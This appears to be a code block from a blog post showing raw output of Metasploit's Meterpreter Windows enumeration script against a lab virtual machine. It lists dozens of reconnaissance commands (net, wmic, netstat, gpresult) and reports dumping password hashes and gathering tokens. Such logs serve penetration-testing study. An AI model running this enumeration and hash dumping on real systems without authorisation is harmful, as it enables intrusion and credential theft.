+ ***[*** ******* ***]***  Running Windows Local Enumerion Meterpreter Script
+ ***[*** ******* ***]***  New session on 10.211.55.128:4444...
+ ***[*** ******* ***]***  Saving report to /root/.msf4/logs/winenum/10.211.55.128_20090711.0514-99271/10.211.55.128_20090711.0514-99271.txt
+ ***[*** ******* ***]***  Checking ***if *** SSHACKTHISBOX-0 is a Virtual Machine ........
+ ***[*** ******* ***]***      This is a VMware Workstation/Fusion Virtual Machine 
+ ***[*** ******* ***]***  Running Command List ...
+ ***[*** ******* ***]***      running command cmd.exe /c set
+ ***[*** ******* ***]***      running command arp -a
+ ***[*** ******* ***]***      running command ipconfig /all
+ ***[*** ******* ***]***      running command ipconfig /displaydns
+ ***[*** ******* ***]***      running command route print
+ ***[*** ******* ***]***      running command net view
+ ***[*** ******* ***]***      running command netstat -nao
+ ***[*** ******* ***]***      running command netstat -vb
+ ***[*** ******* ***]***      running command netstat -ns
+ ***[*** ******* ***]***      running command net accounts
+ ***[*** ******* ***]***      running command net accounts /domain
+ ***[*** ******* ***]***      running command net session
+ ***[*** ******* ***]***      running command net share
+ ***[*** ******* ***]***      running command net group
+ ***[*** ******* ***]***      running command net user
+ ***[*** ******* ***]***      running command net localgroup
+ ***[*** ******* ***]***      running command net localgroup administrators
+ ***[*** ******* ***]***      running command net group administrators
+ ***[*** ******* ***]***      running command net view /domain
+ ***[*** ******* ***]***      running command netsh firewall show config
+ ***[*** ******* ***]***      running command tasklist /svc
+ ***[*** ******* ***]***      running command tasklist /m
+ ***[*** ******* ***]***      running command gpresult /SCOPE COMPUTER /Z
+ ***[*** ******* ***]***      running command gpresult /SCOPE USER /Z
+ ***[*** ******* ***]***  Running WMIC Commands ....
+ ***[*** ******* ***]***      running command wmic computersystem list brief
+ ***[*** ******* ***]***      running command wmic useraccount list
+ ***[*** ******* ***]***      running command wmic group list
+ ***[*** ******* ***]***      running command wmic service list brief
+ ***[*** ******* ***]***      running command wmic volume list brief
+ ***[*** ******* ***]***      running command wmic logicaldisk get description,filesystem,name,size
+ ***[*** ******* ***]***      running command wmic netlogin get name,lastlogon,badpasswordcount
+ ***[*** ******* ***]***      running command wmic netclient list brief
+ ***[*** ******* ***]***      running command wmic netuse get name,username,connectiontype,localname
+ ***[*** ******* ***]***      running command wmic share get name,path
+ ***[*** ******* ***]***      running command wmic nteventlog get path,filename,writeable
+ ***[*** ******* ***]***      running command wmic process list brief
+ ***[*** ******* ***]***      running command wmic startup list full
+ ***[*** ******* ***]***      running command wmic rdtoggle list
+ ***[*** ******* ***]***      running command wmic product get name,version
+ ***[*** ******* ***]***      running command wmic qfe
+ ***[*** ******* ***]***  Extracting software list from registry
+ ***[*** ******* ***]***  Finished Extraction of software list from registry
+ ***[*** ******* ***]***  Dumping password hashes...
+ ***[*** ******* ***]***  Hashes Dumped
+ ***[*** ******* ***]***  Getting Tokens...
+ ***[*** ******* ***]***  All tokens have been processed
+ ***[*** ******* ***]***  Done!</code></pre>
 <!-- /wp:code -->
